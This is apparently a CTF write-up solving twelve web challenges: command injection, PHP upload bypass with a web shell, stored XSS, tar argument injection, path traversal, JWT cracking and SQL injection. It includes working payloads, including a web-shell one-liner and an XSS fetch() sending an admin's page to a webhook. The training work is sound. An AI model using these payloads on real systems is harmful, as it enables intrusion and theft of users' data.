## 1. Injector
**Challenge:** A web page that executes ping commands.
**Solution:**
The URL `http://34.185.167.212:32229/index.php?host=127.0.0.1` returns `Command executed: ping -c 2 127.0.0.1`. This indicates **Command Injection**.
I tried injecting `;ls` after the IP, which returned `flag.php` and `index.php`.
By using `view-source:` or inspecting the page source after injecting `;cat flag.php`, I found the flag.
**Flag:** `//CTF{C0mm4nd...}`

## 2. Web-Intro
**Challenge:** Access Denied page with a cookie.
**Solution:**
The page has a session cookie. The first part is Base64 encoded. Decoding it reveals `{"logged_in":false}`.
I changed it to `true`, re-encoded it to Base64, and used **OWASP ZAP** to modify the cookie header and resend the request.

## 3. Hisix
**Challenge:** A PHP file upload form.
**Solution:**
1.  The form only appears if `?start` is present in the URL: `if (!isset($_GET['start'])){ show_source(__FILE__); exit; }`.
2.  The code converts the extension to lowercase for saving but checks the extension *before* conversion in a case-sensitive way. I bypassed the blacklist by naming the file `shell.PhP`.
3.  It checks for images using `getimagesize`. I bypassed this by adding `GIF89a;` (Magic Bytes) at the start of the file.
4.  Payload: `GIF89a; <?php system($_GET['cmd']); ?>`.
5.  Upload successful, but accessing the file showed only `GIF89a`. This means `system()` commands are blocked.
6.  I uploaded a new script using PHP native functions: `print_r(scandir("."));` to list files and `print_r(ini_get("disable_functions"));` to see blocked functions.
7.  Blocked functions included: `eval, exec, passthru, system`, etc.
8.  I extended the script to check the root `../` and `/home`. I found `flag.php` in the parent directory.
9.  I used `echo file_get_contents("../flag.php");` to read it. The flag was in the page source as a comment.
**Flag:** `flag = "ctf{aaf15c..."`

## 4. Manual Review
**Challenge:** IT Support Ticket System.
**Solution:**
1.  Registered an account and found a "Leave message for admins" feature (Ticket system). This suggests **Stored XSS**.
2.  Simple alert showed a CSRF token. I needed to impersonate the admin.
3.  I tried stealing cookies using an image payload pointing to my **Webhook.site**, but the cookies were likely HttpOnly or just CSRF tokens.
4.  I changed strategy to exfiltrate the entire page content the admin sees:
    ```javascript
    fetch('[https://webhook.site/MY_LINK](https://webhook.site/MY_LINK)', {
      method: 'POST',
      mode: 'no-cors',
      body: document.body.innerHTML
    });
    ```
5.  The POST request received on my webhook contained the flag inside the **User-Agent** string of the bot.
**Flag:** `ctf{4852d6...}`

## 5. TartarSausage
**Challenge:** "Find the sausage and be a king of tar".
**Solution:**
1.  The upload form only accepts JPG/PNG. I uploaded a PHP shell renamed as a fake PNG (`fakeimg.png`).
2.  I found a hidden HTML page (`sadjwjaskdkwkasjdkwasdasdas.html`) titled "Enter tar". Inputting commands there failed.
3.  The server creates a TAR archive of uploaded files. TAR has a vulnerability using `--checkpoint=1` and `--checkpoint-action=exec=cmd`.
4.  Normally, you upload files named `--checkpoint=1` to exploit this via wildcard `*`, but the upload filter enforced `.png` extensions, breaking this method.
5.  I realized I could inject arguments directly into the input field if the server command was `tar -cf archive.tar [USER_INPUT]`.
6.  Payload: `-cf arhiva.tar fakeimg.png --checkpoint=1 --checkpoint-action=exec="ls -la"`.
7.  The output (blind RCE) didn't show in the browser initially, but eventually, I got a file listing showing a directory with a very long Base64-like name.
8.  Accessing `that_long_folder/flag` revealed the flag.

## 6. File-Crawler
**Challenge:** An image viewer using parameters like `?image_name=static/path.jpg`.
**Solution:**
This is a **Directory Traversal** vulnerability. I tried escaping the folder using `../`.
I used a payload like `image_name=../../../../tmp/flag` (no extension mentioned in the hint).
The server downloaded a file named `flag` which contained the text.
**Flag:** `CTF{0caec4...}`

## 7. Under Construction
**Challenge:** A website with a login and JWT session storage.
**Solution:**
1.  The user data in `localStorage` has an `id`, `username`, `role`, and `accessToken`.
2.  Modifying `localStorage` directly didn't work because the server verifies the JWT signature.
3.  Since the site is "under construction", I suspected a weak secret.
4.  I cracked the JWT secret using **John the Ripper**: `john jwt.txt --format=HMAC-SHA256`.
5.  **Secret found:** `letmein`.
6.  I forged a new admin JWT (changing ID to 1 or Role to Admin) signed with this secret.
7.  Accessing `/api/app/admin` with the forged token gave the flag.
**Flag:** `CTF{e590d4...}`

## 8. Ping Station
**Challenge:** Ping an IP address.
**Solution:**
Basic Command Injection. Inputting `127.0.0.1;ls` listed files. `127.0.0.1;cat flag` revealed the flag.
**Flag:** `ECSC{b1c0bc...}`

## 9. Ping Station v2
**Challenge:** Ping an IP, but letters are filtered.
**Solution:**
Trying `127.0.0.1;ls` failed due to validation. `127.0.0.1%0a` (newline) also errored. The challenge requires bypassing a WAF that blocks letters. (Solution pending/in progress in notes, likely involves wildcards `?` or octal bypass).

## 10. Small Data Leak
**Challenge:** A guest list app using Flask/SQLAlchemy. `ls` input triggers a SQL error.
**Solution:**
1.  The error `SELECT ... FROM guests WHERE guests.id = '1==1'` confirms SQL Injection.
2.  I used **UNION SELECT** to retrieve data. The query requires 3 columns.
3.  Trying to list tables from `information_schema.tables` resulted in empty rows (Flask rendering issue).
4.  I used **SQLMap** on Kali:
    * First: `sqlmap -u URL --dbs` to find the DBMS (PostgreSQL).
    * Then: `sqlmap -u URL --dbms=postgresql --tables --delay 1`.
    * **Note:** The `--delay 1` was crucial to avoid getting blocked.
5.  The list of tables contained one table named exactly as the flag: `ctf{57b234...}`.

## 11. Random-Web2
**Challenge:** A blank page with ``.
**Solution:**
1.  Adding `?source` revealed the PHP code.
2.  The code creates a sandbox folder based on `md5(session_id)`.
3.  It accepts a parameter `p`, truncates it to **6 characters**, and runs `system("wget -qO - " . $p);`.
4.  We need Command Injection within 6 chars.
5.  `ls` showed `flag` and `index.php`.
6.  Tried `cat *f` or `sh f*`, but they were too long or failed.
7.  Tried executing via source `;. /f*` but it failed (likely because `flag` is not a valid script or is PHP).
8.  **Solution:** Using `od` (Octal Dump) which is only 2 letters.
    * Payload: `?p=;od /*` (Decodes to `;od /*` which is exactly 6 chars).
    * This output the file content in octal format.
    * I used a Python script to split the spaces and convert octal to ASCII strings.
**Flag:** `CTF{fc8155...}`

## 12. Authorization
**Challenge:** Blank page, 404 on `/admin`.
**Solution:**
Checking `robots.txt` showed a disallowed folder `/auth`. Accessing it gave "405 Method Not Allowed". (Further steps likely involve changing HTTP method to POST/PUT).
